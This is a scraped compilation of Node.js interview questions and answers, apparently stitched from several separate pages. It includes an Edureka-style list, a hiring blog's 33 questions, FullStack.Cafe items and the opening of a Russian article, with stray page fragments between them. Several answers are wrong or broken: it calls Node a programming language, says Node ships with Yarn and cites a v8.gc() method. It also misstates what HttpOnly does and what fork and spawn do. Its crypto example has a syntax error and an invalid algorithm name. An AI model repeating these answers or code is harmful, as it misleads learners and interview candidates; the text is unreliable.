Want to upskill yourself to get ahead in your career? Check out this video

36. What is an error-first callback in Node.js?

Error-first callbacks in Node.js are used to pass errors and data. The very first parameter you need to pass to these functions has to be an error object while the other parameters represent the associated data. Thus you can pass the error object for checking if anything is wrong and handle it. In case there is no issue, you can just go ahead and with the subsequent arguments.

_________________________________________________

JavaScript
 var myPost = new Post({title: 'edureka'});
 myPost.save(function(err,myInstance){
 if(err){
 //handle error and return
}
//go ahead with `myInstance`
});
______________________________________
Code language: JavaScript (javascript)
37. What do you understand by Reactor Pattern in Node.js?

Reactor Pattern in Node.js is basically a concept of non-blocking I/O operations. This pattern provides a handler that is associated with each I/O operation and as soon as an I/O request is generated, it is then submitted to a demultiplexer. This demultiplexer is a notification interface which is capable of handling concurrency in non-blocking I/O mode. It also helps in collecting each and every request in the form of an event and then place each event in a queue. Thus resulting in the generation of the Event Queue. Simultaneously, we have our event loop which iterates the events present in the Event Queue.

38. What are LTS releases of Node.js?

LTS stands Long Term Support version of Node.js that receives all the critical bug fixes along with security updates and performance improvements. These versions are supported for at least 18 months and mainly focus on stability and security. The modifications done to the LTS versions are restricted to the bug fixes, security upgrade, npm, and documentation updates, performance improvement, etc.

39. List down the major security implementations within Node.js?

Major security implementations in Node.js are:

Authentications
Error Handling
40. Explain the concept of middleware in Node.js?

In general, middleware is a function receives the Request and Response objects. In other words, in an application’s request-response cycle these functions have access to various request & response objects along with the next function of the cycle. The next function of middleware is represented with the help of a variable, usually named next. Most commonly performed tasks by the middleware functions are:

Execute any type of code
Update or modify the request and the response objects
Finish the request-response cycle
Invoke the next middleware in the stack
41. What do you understand by ESLint?

ESLint is an open source project initially developed by Nicholas C. Zakas in 2013 which aims to provide a linting utility for JavaScript through a plug. Linters in Node.js are good tools for searching certain bug classes, especially those which are related to the variable scope.

42. For Node.js, why Google uses V8 engine?

Google uses V8 as it is a Chrome runtime engine that converts JavaScript code into native machine code. This, in turn, speeds up the application execution and response process and give you a fast running application.

43. Differentiate between spawn() and fork() methods in Node.js?

In Node.js, the spawn() is used to launch a new process with the provided set of commands. This method doesn’t create a new V8 instance and just one copy of the node module is active on the processor. When your child process returns a large amount of data to the Node you can invoke this method.

Syntax:

__________________________________________________________

CSS
child_process.spawn(command[, args][, options])
____________________________________________
Code language: CSS (css)
Whereas, the fork() in Node.js is a special instance of spawn() that executes a new instance of the V8 engine. This method simply means that multiple workers are running on a single Node code base for various task.

Syntax:

_______________________________________________________________

CSS
child_process.fork(modulePath[, args][, options])
________________________________________________
Code language: CSS (css)
In case you are facing any challenges with these Node.js Interview Questions, please mention your problems in the section comment section below.

44. What do you understand by global objects in Node.js?

In Node.js, Globals are the objects which are global in nature and are available in all the modules of the application. You can use these objects directly in your application, rather than having to include them explicitly. The global objects can be modules, functions, strings, object, etc. Moreover, some of these objects can be in the module scope instead of global scope.

45. How assert works in Node.js?

In Node.js, assert is used to write tests. It only provides feedback only when any of the running test cases fails. This module gives you a set of assertion tests which are then used for testing invariants. It is basically used internally by Node.js but using require(‘assert’) code, it can be used in other applications as well.

___________________________________________________________

JavaScript
var assert = require('assert');
function mul(a, b) {
return a * b;
}
var result = mul(1,2);
assert( result === 2, 'one multiplied by two is two');
______________________________________________
Code language: JavaScript (javascript)
46. Explain the usage of a buffer class in Node.js?

Buffer class in Node.js is used for storing the raw data in a similar manner of an array of integers. But it corresponds to a raw memory allocation that is located outside the V8 heap. It is a global class that is easily accessible can be accessed in an application without importing a buffer module. Buffer class is used because pure JavaScript is not compatible with binary data. So, when dealing with TCP streams or the file system, it’s necessary to handle octet streams.

47. Differentiate between readFile vs createReadStream in Node.js?

Node.js provides two ways to read and execute files which are using readFile and CreateStream. readFile() is a fully buffered process which returns the response only when the complete file is pushed into the buffer and is read. It is a memory intensive process and in case of large files, the processing can be very slow. Whereas createReadStream is a partially buffered which treats the entire process as an event series. The entire file is split into chunks which are then processed and sent back as a response one by one. Once done, they are finally removed from the buffer. Unlike readFile, createReadStream is really effective for the processing of the large files.

48. Explain the concept of Punycode in Node.js?

In Node.js, Punycode is an encoding syntax that is used for converting Unicode (UTF-8) string of characters into a basic ASCII string of characters. It is important as the hostnames can only understand the ASCII characters. Thus, Node.js version 0.6.2 onwards, it was bundled up with the default Node package. If you want to use it with any previous versions, you can easily do that by using the following code:

Syntax:

____________________________________

JavaScript
punycode = require('punycode');
___________________________
Code language: JavaScript (javascript)
49. Does Node.js provide any Debugger?

Node.js do provide a simple TCP based protocol and debugging client that comes built-in. In order to debug your JavaScript file, you can use the below debug argument followed by js file name that you want to debug.

Syntax:

________________________________________________________________________________________

XML
node debug [script.js | -e "script" | &lt;host&gt; : &lt;port&gt; ]
___________________________________________________________________
Code language: HTML, XML (xml)
In case you are facing any challenges with these Node.js Interview Questions, please mention your problems in the section comment section below.

50. Does node run on windows?

Yes – it does.
	

What is a Node js Developer:
Node Js developers are IT professionals responsible for designing, developing, and testing Node Js applications. Node Js developers typically work on web applications that leverage Node Js frameworks, such as Express.js and Sails.js. They handle Node Js development tasks like API integration, server configuration, debugging, and unit testing.

Node js Developer Qualifications
Hiring Node Js developers requires a keen eye for Node Js qualifications. Node Js developers should have the following minimum qualifications:

Bachelor's degree in Information Technology or Computer Science
Some years of experience working with Node Js
Experience developing Node Js applications with Node Js frameworks
Proficiency with Node Js databases, web servers, and cloud platforms
Knowledge of Node Js package managers and build tools
Strong understanding of Node Js concepts, such as asynchronous programming and event-driven architecture
Excellent debugging and troubleshooting skills
Strong analytical and problem-solving skills
Good communication and collaboration skills
Additionally, Node js developers are often required to have a working knowledge of the following:

Node js frameworks such as Express and Hapi
Node js databases such as MongoDB and CouchDB
Node js web servers such as Apache and Nginx
Node js cloud platforms such as Amazon Web Services and Azure
Node js package managers such as NPM and Yarn
What Does a Node js Developer Do
It's important to understand the roles and responsibilities of Node Js developers so you can make sure they have what it takes to excel in their role and also ask relevant Node Js interview questions. Generally, Node Js developers have the following roles and responsibilities:

Developing and maintaining all server-side network components
Integrating user-facing web components with server-side logic
Designing and developing web applications using Node Js frameworks
Writing efficient code that follows best practices
Testing web applications and debugging errors
Optimizing web application performance
Collaborating with front-end developers to ensure web applications are properly integrated
Maintaining web servers and databases
Updating web applications as needed with new features, security patches, and bug fixes
Node js Interview Questions with Answers
Let's dive into Node Js interview questions and answers. We'll discuss these questions in three categories:

Junior/ Entry-level/ Fresher
Mid-level/ Intermediate
Senior/ Advanced
Junior Node Js Interview Questions
These Node Js interview questions are for candidates starting out in web development and Node Js. They may have just cleared college or be in the early stages of their web development career.

What is Node Js?
Node Js is a JavaScript-based programming language that allows web developers to build web applications. It's an open-source runtime environment powered by the Google Chrome V8 JavaScript engine and uses a non-blocking I/O model and event-driven architecture.

What is the purpose of Node Js?
Node Js enables web developers to create web applications quickly and easily. It provides an event-driven, non-blocking I/O model for web applications. Additionally, Node Js makes it easier to manage web application resources because of its  asynchronous programming features. It also supports web sockets and other web technologies, making web development easier.

What do you understand by the term I/O?
I/O stands for Input/Output. It is the process of reading and writing data to a computer system. Node Js uses a non-blocking I/O model, which allows developers to read and write data asynchronously. This means that the Node Js application can continue to process tasks even when waiting for a response from an external system.

What makes Node.js superior to other popular frameworks?
Node Js is faster and more efficient than other popular frameworks because of its  v8 engine. The v8 engine compiles and executes JavaScript code faster than other frameworks, making Node Js applications run faster. Additionally, Node Js is single threaded, meaning it can handle more simultaneous requests than other frameworks. This makes Node Js more efficient and cost-effective to run.

In JavaScript, what is a first-class function?
In JavaScript, a first-class function is a function you can treat as any other value in the language. Developers can pass it as an argument, store it in a variable, or return it from a function. This function reduces code duplication by allowing developers to write modular code that they can reuse.

What is asynchronous programming?
Asynchronous programming is a programming technique where the program does not need to wait for a task to complete before continuing with the execution of instructions. This enables applications to process multiple tasks in parallel, thereby improving the application's performance.

What does REPL stand for?
REPL stands for Read Eval Print Loop. It is a type of interactive programming interface that evaluates user input and prints the result. This allows developers to quickly test small pieces of code without having to write a complete program.

What is the event loop in Node Js?
The event loop in Node Js is a mechanism that enables Node Js to process multiple tasks in parallel. It consists of an event queue for storing incoming requests, file changes, or input from an API. The event loop then processes these events in a non-blocking manner, allowing Node Js applications to take advantage of its asynchronous programming features.

What are the read write operations in Node Js?
The read/write operation in Node Js enables developers to read and write data from files on the server. This operation reads and writes data from a file, creating, updating, and deleting files.

Mid-level Node Js Interview Questions
These Node Js interview questions are for candidates who are more experienced with Node Js. They may have a few years (3-5 years) of experience working with Node Js and be familiar with some more advanced web development concepts.

What is the HTTP module in Node Js?
The HTTP module in Node Js handles HTTP requests and responses. It provides an interface to create web servers and make http calls to web APIs. The HTTP module is also responsible for parsing requests and providing methods to send data over the web. Additionally, the http module provides several other useful functions, such as creating web sockets, establishing secure connections, and more.

In Node.js, how would you use a URL module?
The URL node module enables developers to parse URLs into its component parts. It provides methods to extract query parameters, pathname, path, hostname, port, and other URL components. The URL module can also create URLs from its component parts.

What is an asynchronous callback?
An asynchronous callback is a function that is executed after an asynchronous operation completes. When the asynchronous operation returns a result, it triggers this function to perform additional tasks.

What is command line, and how do you use it in Node Js?
The command line is a text-based user interface used to execute commands in a command-line interface (CLI). It is commonly used to execute tasks such as running scripts and working with files. In Node Js, the command line can run scripts, install packages, and more.

What is a package manager?
A package manager is a command-line utility used to install, update and remove software packages. Node Js comes with two package managers: NPM and Yarn.  NPM installs packages from the command line, while Yarn automates package installation by managing a list of dependencies.

What is the eventemitter class in Node Js?
The event emitter class in Node Js is a utility that enables developers to listen for and emit events. It creates event handlers that can be triggered when an event occurs. This event emitter class is used in Node Js event-driven applications, such as event-driven web servers and event-based APIs.

What does the var HTTP require HTTP command do in Node Js?
The var HTTP require HTTP command is used to import the http module into a Node Js application. This command creates an instance of the http class, which provides methods and properties to create web servers and handle HTTP requests.

What are the different types of streams in Node Js?
The different types of streams in Node Js are readable, writable, and duplex. The readable stream is used for reading data from a source. On the other hand, the writable stream is used for writing data to a destination while the duplex stream is used for reading and writing data simultaneously.

Advanced Node Js Interview Questions
These are Node Js interview questions for applicants with 5 years of experience or more. These candidates should be familiar with Node Js concepts and be able to handle advanced development tasks.

What is the difference between a callback and a promise in Node Js?
Callbacks are functions used to handle asynchronous operations. In contrast, promises are objects that represent the result of an asynchronous operation.

What are the benefits of using promises instead of callbacks?
Promises improve the readability and maintainability of code by eliminating the "callback hell" issue. Promises are object-oriented, making it easier to debug and test code. Additionally, promises can be chained together for better control flow and error handling. Finally, promises make asynchronous programming easier by managing asynchronous operations in a single place. Finally, streams support asynchronous programming and enable developers to return data without waiting for the entire process to complete.

What is the purpose of try/catch in Node Js?
The try/catch block in Node Js handles errors or exceptions. It allows developers to execute code that might throw an error and then handle the error if it occurs. This makes debugging and testing code much easier, as developers can catch errors and handle them in a single place.

What differentiates Node.js's fork() and spawn() methods?
The fork() method in Node Js creates a new process that is a copy of the existing one. It has access to all the same variables and functions as the existing process. On the other hand, the spawn() method creates a new process separate from the existing one. The spawn() method does not have access to the same variables and functions as the existing process, but it runs faster than the fork() method.

In Node.js, how do you open a file?
You can open a file in Node Js using the  fs.open() method. This method takes two arguments: a filename and a flag that specifies how to open the file. The fs.open() method returns a file descriptor used to read, write, and close the file.

Which HTTP requests does Node Js support?
Node Js supports the HTTP GET, POST, HEAD, and DELETE requests.

The GET request retrieves data from a server.
The POST request sends data to a server.
The HEAD request retrieves headers from a server.
The DELETE request deletes data from a server.
What are the benefits of using streams in Node Js?
Streams simplify data processing by allowing developers to process data in chunks. This reduces memory usage, improves performance, and allows faster data transfer. Additionally, streams can pipe data from one stream to another, making it easier to manage data flows.

What is the purpose of process.nextTick in Node Js?
The process.nextTick command in Node Js is used to schedule a callback function to be executed as soon as possible. This command can defer a callback until the current execution context is finished. It is commonly used to ensure asynchronous operations are executed in the correct order.

What is the purpose of a cluster in Node Js?
The cluster module in Node Js enables developers to create multiple processes or threads that can be used to take advantage of multiple CPU cores. This allows Node Js applications to scale more efficiently and improves their performance.

What is v8 heap?
The v8 heap is the memory space allocated by the v8 JavaScript engine for storing objects and variables. v8 uses this memory space to store all the data associated with a Node Js application, including variables, objects, and function calls. v8 is optimized to reduce memory usage and improve the performance of applications. The v8 heap is an important part of Node Js and must be managed properly to ensure applications run efficiently. Developers should monitor v8 heap usage and tune their applications for optimal performance. Additionally, v8 provides several performance-related flags to help developers better manage v8 heap usage.

What is garbage collection in Node Js?
Garbage collection is a process used by v8 to reclaim memory from unused objects and variables. v8 uses garbage collection algorithms to determine which parts of v8 heap can be released and reclaimed. v8 runs garbage collection periodically, so developers should ensure their applications use v8 resources efficiently to minimize garbage collection occurring. This improves the performance of Node Js applications. Garbage collection can also be manually triggered by calling the v8.gc() method. This can be used to force garbage collection and reclaim memory when needed.

What are the different types of errors in Node Js?
The different types of errors in Node Js include syntax errors, runtime errors, and logical errors. Syntax errors occur when the code does not conform to the syntax of the language. Runtime errors occur when a program is executing and an unexpected error occurs. Logical errors occur when the written code is correct but produces an incorrect result. Developers can debug and test these errors using the Node Js error handling functions. These include try/catch blocks, the error-first callback pattern, and Promises.

ire Jobs Contact Sign in Post a role →

← All posts
Engineering
33 Node.JS Interview Questions and Answers to Ask Aspiring Node Developers
Viki Kovalenko June 1, 2021
$(document).on('turbolinks:load', function(){hljs.highlightAll()});
The interview round is a vital part of any recruitment process. Employers need to ask the right questions to candidates during the interview to screen for essential skills. The same applies to hiring Node.js developers, where interview questions are fundamental for assessing technical prowess.

In this post, we will present the top NodeJS interview questions to ask your potential developer. We will sort the questions into three expertise levels (basic, intermediate, and advanced) for more convenience.

Basic Level Node Interview Questions
Basic level questions are for developers who are starting out. You need to ask them simple questions that revolve around what is Node JS and how it works. The questions help employers determine the depth of understanding of the aspirant and if they are suitable for the role.

Make sure you have a thorough screening process and then ask the following Node.JS interview questions:

1. Name a few popular apps developed with Node.JS.
Answer:

Many leading businesses have used Node.JS to develop quality apps. Some of the most popular ones include Netflix, Uber, LinkedIn, PayPal, and eBay. We can go for Node JS download and create reliable apps for mobile and desktop.

2. Why is Node preferred for real-time applications?
Answer:

Node meets the low-latency requirements of real-time applications. It is ideal for handling countless client requests and suitable for instant messaging apps and online gaming. Node also allows the reuse of library code packages to save time and effort. Additionally, data syncing between the server and end-user happens quickly when we use Node.JS.

3. Why will you choose Node over other popular frameworks?
Answer:

Developers prefer Node for its simplicity. We can also take advantage of a short response time due to event-based models and non-blocking I/O. Node even supports concurrent processing and eliminates the need to use thread management. Additionally, developers can enjoy a reliable performance as Node is built on Google Chrome V8 Engine.

4. What do you know about event-driven programming?
Answer:

Event-driven programming is the triggering of functions based on events. Developers can program an app to execute specific functions when users click a button, hover the mouse over texts, or press a key. An event initiates a callback function registered beforehand with the element. Event-driven programming makes Node a fast and reliable development option.

5. Why is Node not suitable for the development of apps with monolith architecture?
Answer:

Node.JS relies on single-thread programming to execute functions. Monolith apps generally come with multiple functionalities, and a single-thread approach can delay services. Additionally, a single thread makes use of a single processor core and doesn’t fully utilize server capabilities. As a result, Node is not suitable for monolith apps that have a high load.

6. Can you tell me the steps “Control Flow” uses to control function calls?
Answer:

The steps are:

Control Flow first controls the order of execution.
The next step is data collection.
The third step is to restrict concurrency.
The last step involves calling the next step your program.
7. Write a code to setup a simple server on Node to return Hello World.
Answer:

We can create a simple server on Node using:

var http = require("http");

http.createServer(function (request, response) {

  response.writeHead(200, {'Content-Type': 'text/plain'});

  response.end('Hello World\n');

}).listen(3000);
8. What do you use to handle async callbacks in Node.JS?
Answer:

We can use an Event loop to handle every async callback on Node. Developers can also assign listeners to events to execute a callback.

9. How does fork in Node differ from other technologies?
Answer:

In Node.JS, fork helps in the creation of a fresh instance of the V8 engine. We can run many workers for code execution using fork in Node. In the case of other frameworks, fork enables the spawning of child processes.

10. What are the types of API functions you find in Node? Explain them.
Answer:

We find two types of API functions in Node. They are:

Asynchronous, non-blocking functions: These are generally I/O operations that you can fork out of main loops.
Synchronous, non-blocking functions: These are functions that impact the process controlling the main loop..
11. What is Node JS Express?
Answer:

Node.JS Express is a lightweight yet reliable framework to build quality mobile and web apps. Developers can use it to develop web apps based on Node rapidly. Node Express has a range of advanced features to facilitate mobile and web development.

Intermediate Level Node Interview Questions
Node developers with a few years of experience can be categorized under the intermediate level. They can create apps and websites using Node and make full use of all features. Intermediate developers are also familiar with ancillary frameworks and how to use them to facilitate development. As a result, your Node JS interview questions should be able to challenge the candidates’ intellect.

Recruiters can ask the following questions during the interview:

12. Can you give an example of an error-first callback?
Answer:

The following is an example of an error-first callback:

fs.readFile( "file.json", function ( err, data ) {
  if ( err ) {
    console.error( err );
  }
  console.log( data );
});
13. Tell me a few technical differences between back-end and front-end development.
Answer:

Front-end development relies on JavaScript, CSS, HTML, and similar web and markup languages. On the other hand, back-end development uses Ruby, Python, Perl, and other scripting and programming languages.

Front-end focuses on achieving better navigability and accessibility for the users. Back-end, on the contrary, focuses on optimizing security.

Another difference is front-end development using AJAX and asynchronous requests. Back-end relies on server architecture instead.

14. What are some of the functions of middleware in Node?
Answer:

Middleware functions in Node.js help in the execution of all types of codes. They also enable the modification or update of response and request objects. Additionally, middleware can be used to initiate the following middleware in your stack.

15. How do you avoid callback hell in Node?
Answer:

We can avoid callback hell in Node by using Async.js, Async-Await, and Promises. Async.js can help developers successfully manage JavaScript’s asynchronous implications.

16. How can you import the two functions below in a file called greet.js using module.exports?
module.exports = {
    greetInEnglish: function() {
        return "HELLO";
    },
    greetInKorean: function() {
        return "ANNYEONGHASEYO";
    }
};
Answer:

We can use module.exports to import the above functions into another file with the code:

var eduGreets = require ("./greet.js");
eduGreets.greetInEnglish() //HELLO
eduGreets.greetInKorean() //ANNYEONGHASEYO
17. Name two tools you can utilize to ensure consistent style.
Answer:

We can use Standard and ESLint to ensure consistent style.

18. What are the features of a Stub?
Answer:

The best feature of a Stub is its compatibility with Node.JS. Another excellent feature is predefined and usable extensions you get out-of-the-box. We can also create lightweight objects that can extend down their trees. Developers can also extend the capabilities of Stub with an ExtensionManager.

19. What are exit codes in Node.JS? Name and explain a few of them.
Answer:

Exit codes in Node provide developers an explanation behind the termination of processes. A few exit codes are:

Code – 1: Signifies a fatal exception has occurred and is not handled.

Code – 5: An error has occurred in V8 and can be fatal.

Code – 7: It indicates Internal Exception handler Run-time failure. The error has occurred when the call for bootstrapping function was made.

20. Give an example of using the Async-Await pattern in Node.
Answer:

The following shows how we can use Async-Await in Node.JS:

function wait(timeout) {
    return new Promise((resolve) => {
        setTimeout(() => {
            resolve()
        }, timeout);
    });
}

async function requestWithRetry(url) {
    const MAX_RETRIES = 10;
    for (let i = 0; i <= MAX_RETRIES; i++) {
        try {
            return await request(url);
        } catch (err) {
            const timeout = Math.pow(2, i);
            console.log('Waiting', timeout, 'ms');
            await wait(timeout);
            console.log('Retrying', err.message, i);
        }
    }
}
21. Which tasks will you perform asynchronously with the help of the Event loop?
Answer:

We can perform complex computation, I/O operations, and blocking asynchronously with the help of the Event loop.

22. What are the uses of package.json? Name some of its fields.
Answer:

Package.json is a file containing a range of project metadata information. It delivers information to npm to identify and manage project dependencies.

The following are a few fields:

Description
Name
Author
Advanced Level Node Interview Questions
Advanced Node developers are highly sought after in the industry. They learn and use Node JS for a plethora of development needs, including front-end and back-end. You can expect great results by hiring an expert Node.JS developer. Plus, they know how to use different technologies and frameworks to build top products.


Here are some advanced NodeJS interview questions to ask:


23. What are some attributes that help you safeguard HTTP cookies from XSS attacks?
Answer:

We can use the following attributes to prevent XSS attacks from compromising HTTP cookies:


Set-Cookie: [name]=[value]; HttpOnly: Ensures cookies are submitted only to the domain or origin.
Set-Cookie: [name]=[value]; Secure: Makes sure cookies use only secure channels for sending.
X-XSS-Protection: 1; mode=block: Prevents pages from loading once they identify signs of injection attacks.
24. Rewrite the following JavaScript code to keep the same output in Node.
console.log("first");
setTimeout(() => {
    console.log("second");
}, 0);
console.log("third");
Output of Code:
First
Third
Second
Answer:

We can rewrite the code in Node as below:

console.log("first");

setImmediate(() => {

    console.log("second");

});

console.log("third");
25. Does Node support cryptography?
Answer:

Node.JS uses a module called Crypto to provide cryptography functions. You can take advantage of features like verify functions, decipher, cipher, and more. Additionally, you receive a collection of hash HMAC wrappers. An example can be:

const crypto = require'crypto');
const secret = 'akerude';
const hash = crypto.createHmac('swaEdu', secret).update('Welcome to Edureka').digest('hex');
console.log(hash);
26. How can you use clustering to improve Node performance?
Answer:

Clustering helps Node applications utilize multi-core system resources optimally. Node uses a single processor as it is a single threat platform. So, the rest of the cores can go unused. Cluster mode allows developers to initiate multiple processes, resulting in many instances of the event loop. The Cluster Manager helps developers track the status of each instance.

27. How can you secure a Node application?
Answer:

We can strengthen the security of a Node.JS app in many ways, like:

Authentication: The process of authentication ensures only legit users can access the app. Node uses session-based and token-based methods to authenticate users. Both methods work to secure Node apps against unauthorized access.

Validating requests:Developers can program an app to validate incoming requests. The app can reject the requests if they seem incredible or have incompatible formats. Allowing only valid requests provides a layer of security to Node apps.

Additional tools: Various tools like Helmet, Node Rate Limiter, and Csurf can help developers secure Node apps. For example, Helmet uses HTTP headers to protect apps.

28. Write a code to show how you will use Event Emitter in Node.
Answer:

The code below shows how to use Event Emitter:

const EventEmitter = require('events');
class MyEmitter extends EventEmitter {}
const myEmitter = new MyEmitter();
myEmitter.on('event', () => {
    console.log('an event occurred!');
});
myEmitter.emit('event');
29. How do you use Punycode in Node 0.6.2 and previous versions?
Answer:

The encoding syntax Punycode helps convert a string of Unicode characters into ASCII character strings. It helps hostnames decipher ASCII characters. We can use Punycode in Node 0.6.2 or lower versions through the code -

punycode = require('punycode');
30. What do you know about the libuv library?
 Answer:

The libuv library is responsible for handling the thread pool in Node. It is a C library that supports multiple platforms. Libuv library facilitates asynchronous operations based on I/O.

31. What are the benefits of keeping Express ‘app’ and ‘server’ separate?
Answer:

The main benefit of keeping Express ‘app’ and ‘server’ separate is faster execution of testing. We can test API in-process without the need for handling network calls. Additionally, developers can deploy an API to varied network conditions.

32. How do you make an HTTP post request in Node?
Answer:

We can make a post request in Node.JS with the code below:

var request = require('request');
request.post('http://www.example.com/action', { form: { key: 'value' } },
    function (error, response, body) {
        if (!error && response.statusCode == 200) {
            console.log(body)
        }
    });
33. What are some steps to handle maintenance problems in Node?
Answer:

We can start with a code review to handle maintenance issues. Using microservices and working to improve code quality can also help. We can also aim for better documentation and update the whole stack.

Final Thoughts
Node JS interview questions help employers assess the skills and technical capabilities of aspiring developers. You can ask questions we listed based on the level of your candidates and experience. Make your screening process count to get the most promising candidates for the interview round. You can then use our interview questions to select your new Node developer.

7 Hardest Node.js Interview Questions & Answers
#
node
#
interview
#
questions
#
fullstack
7 Hardest Node.js Interview Questions & Answers
Node.js is an open-source, cross-platform JavaScript run-time environment that executes JavaScript code server-side. Node.js lets developers use JavaScript for server-side scripting—running scripts server-side to produce dynamic web page content before the page is sent to the user's web browser.

🔴 Originally published on FullStack.Cafe - Kill Your Tech & Coding Interview

Q1: Provide some example of config file separation for dev and prod environments
Topic: Node.js
Difficulty: ⭐⭐⭐⭐

A perfect and flawless configuration setup should ensure:

keys can be read from file AND from environment variable
secrets are kept outside committed code
config is hierarchical for easier findability
Consider the following config file:

var config = {
  production: {
    mongo : {
      billing: '****'
    }
  },
  default: {
    mongo : {
      billing: '****'
    }
  }
}

exports.get = function get(env) {
  return config[env] || config.default;
}
And it's usage:

const config = require('./config/config.js').get(process.env.NODE_ENV);
const dbconn = mongoose.createConnection(config.mongo.billing);
🔗Source: github.com/i0natan/nodebestpractices

Q2: What are the timing features of Node.js?
Topic: Node.js
Difficulty: ⭐⭐⭐⭐

The Timers module in Node.js contains functions that execute code after a set period of time.

setTimeout/clearTimeout - can be used to schedule code execution after a designated amount of milliseconds
setInterval/clearInterval - can be used to execute a block of code multiple times
setImmediate/clearImmediate - will execute code at the end of the current event loop cycle
process.nextTick - used to schedule a callback function to be invoked in the next iteration of the Event Loop
function cb(){
  console.log('Processed in next iteration');
}
process.nextTick(cb);
console.log('Processed in the first iteration');
Output:

Processed in the first iteration
Processed in next iteration
🔗Source: github.com/jimuyouyou

Q3: Explain what is Reactor Pattern in Node.js?
Topic: Node.js
Difficulty: ⭐⭐⭐⭐⭐

Reactor Pattern is an idea of non-blocking I/O operations in Node.js. This pattern provides a handler(in case of Node.js, a callback function) that is associated with each I/O operation. When an I/O request is generated, it is submitted to a demultiplexer.

This demultiplexer is a notification interface that is used to handle concurrency in non-blocking I/O mode and collects every request in form of an event and queues each event in a queue. Thus, the demultiplexer provides the Event Queue.

At the same time, there is an Event Loop which iterates over the items in the Event Queue. Every event has a callback function associated with it, and that callback function is invoked when the Event Loop iterates.

🔗Source: hackernoon.com

Q4: What is LTS releases of Node.js why should you care?
Topic: Node.js
Difficulty: ⭐⭐⭐⭐⭐

An LTS(Long Term Support) version of Node.js receives all the critical bug fixes, security updates and performance improvements.

LTS versions of Node.js are supported for at least 18 months and are indicated by even version numbers (e.g. 4, 6, 8). They're best for production since the LTS release line is focussed on stability and security, whereas the Current release line has a shorter lifespan and more frequent updates to the code. Changes to LTS versions are limited to bug fixes for stability, security updates, possible npm updates, documentation updates and certain performance improvements that can be demonstrated to not break existing applications.

🔗Source: github.com/i0natan/nodebestpractices

Q5: Why should you separate Express 'app' and 'server'?
Topic: Node.js
Difficulty: ⭐⭐⭐⭐⭐

Keeping the API declaration separated from the network related configuration (port, protocol, etc) allows testing the API in-process, without performing network calls, with all the benefits that it brings to the table: fast testing execution and getting coverage metrics of the code. It also allows deploying the same API under flexible and different network conditions. Bonus: better separation of concerns and cleaner code.

API declaration, should reside in app.js:

var app = express();
app.use(bodyParser.json());
app.use("/api/events", events.API);
app.use("/api/forms", forms);
Server network declaration, should reside in /bin/www:

var app = require('../app');
var http = require('http');

/**
 * Get port from environment and store in Express.
 */

var port = normalizePort(process.env.PORT || '3000');
app.set('port', port);

/**
 * Create HTTP server.
 */

var server = http.createServer(app);
🔗Source: github.com/i0natan/nodebestpractices

Q6: What is the difference between process.nextTick() and setImmediate() ?
Topic: Node.js
Difficulty: ⭐⭐⭐⭐⭐

The difference between process.nextTick() and setImmediate() is that process.nextTick() defers the execution of an action till the next pass around the event loop or it simply calls the callback function once the ongoing execution of the event loop is finished whereas setImmediate() executes a callback on the next cycle of the event loop and it gives back to the event loop for executing any I/O operations.

🔗Source: codingdefined.com

Q7: Rewrite the code sample without try/catch block
Topic: Node.js
Difficulty: ⭐⭐⭐⭐⭐

Consider the code:

async function check(req, res) {
  try {
    const a = await someOtherFunction();
    const b = await somethingElseFunction();
    res.send("result")
  } catch (error) {
    res.send(error.stack);
  }
}
Rewrite the code sample without try/catch block.

Answer:

async function getData(){
  const a = await someFunction().catch((error)=>console.log(error));
  const b = await someOtherFunction().catch((error)=>console.log(error));
  if (a && b) console.log("some result")
}
or if you wish to know which specific function caused error:

async function loginController() {
  try {
    const a = await loginService().
    catch((error) => {
      throw new CustomErrorHandler({
        code: 101,
        message: "a failed",
        error: error
      })
    });
    const b = await someUtil().
    catch((error) => {
      throw new CustomErrorHandler({
        code: 102,
        message: "b failed",
        error: error
      })
    });
    //someoeeoe
    if (a && b) console.log("no one failed")
  } catch (error) {
    if (!(error instanceof CustomErrorHandler)) {
      console.log("gen error", error)
    }
  }
}

Десять вопросов о Node.js, на которые вы не сможете ответить
6 мин
66K
Блог компании RUVDS.com
JavaScript
*
Node.JS
*
Веб-разработка
*
Перевод
Автор оригинала: Samer Buna
В этом году, на конференции Forward.js, посвящённой JavaScript, я выступал с докладом «You don’t know Node». Во время выступления я задал аудитории несколько вопросов о Node, и большинство присутствующих не смогли ответить на многие из них. А ведь мой доклад слушали технические специалисты. Никаких подсчётов я не производил, но выглядело всё именно так, да и несколько слушателей, которые подошли ко мне после выступления, это подтвердили.



Проблема, которая заставила меня сделать то выступление, заключается в том, что, по-моему, система обучения Node выстроена неправильно. Большинство учебных материалов сосредоточено на пакетах Node, но не на самой платформе. Часто этих пакеты служат обёртками для модулей Node (вроде http или stream). Как результат, тот, кто не знает Node и сталкивается с проблемой, источником которой может оказаться не некий пакет, а платформа, оказывается в крайне невыгодном положении.

Я выбрал несколько вопросов и ответов с той конференции и включил их в эту статью. Сами вопросы представлены в заголовках разделов статьи. Попытайтесь, прочтя вопрос, не читать дальше, а сначала мысленно на него ответить. Если вы найдёте ошибку в моих ответах — пожалуйста дайте мне знать.

Вопрос №1. Что такое стек вызовов и является ли он частью движка V8?

Стек вызовов (Call Stack) определённо является частью V8. Это — структура данных, которую V8 использует для отслеживания вызовов функций. Каждый раз, когда мы вызываем функцию, V8 помещает ссылку на эту функцию в стек вызовов, а когда из этой функции вызываются другие функции, продолжает делать то же самое со ссылками на них. Кроме того, в стек попадают и функции, которые вызывают сами себя рекурсивно.


Стек вызовов. Скриншот из моего курса на Pluralsight, посвящённого продвинутому изучению Node.js

Когда, при вложенных вызовах функций, функция завершает выполнение, V8 извлекает ссылку на функцию из верхней части стека вызовов и подставляет возвращённое ей значение туда, куда требует логика программы.

Почему это важно понимать при работе с Node? Дело в том, что на один процесс Node приходится только один стек вызовов. Если стек будет полон, процесс окажется нагружен какой-то работой. Об этом стоит помнить.

Вопрос №2. Что такое цикл событий? Является ли он частью движка V8?

Как вы думаете, где на следующем рисунке изображён цикл событий (event loop)?


Окружение V8. Скриншот из моего курса на Pluralsight, посвящённого продвинутому изучению Node.js

Цикл событий реализован в библиотеке libuv. Он не является частью V8.

Цикл событий — это сущность, которая обрабатывает внешние события и преобразует их в вызовы коллбэков. Это — довольно сложно устроенный цикл, который берёт события из очереди событий и помещает их коллбэки в стек вызовов.

Если вы впервые слышите о цикле событий, вышеприведённые рассуждения могут оказаться не особенно вразумительными. Цикл событий является частью гораздо более общей картины:


Цикл событий. Скриншот из моего курса на Pluralsight, посвящённого продвинутому изучению Node.js

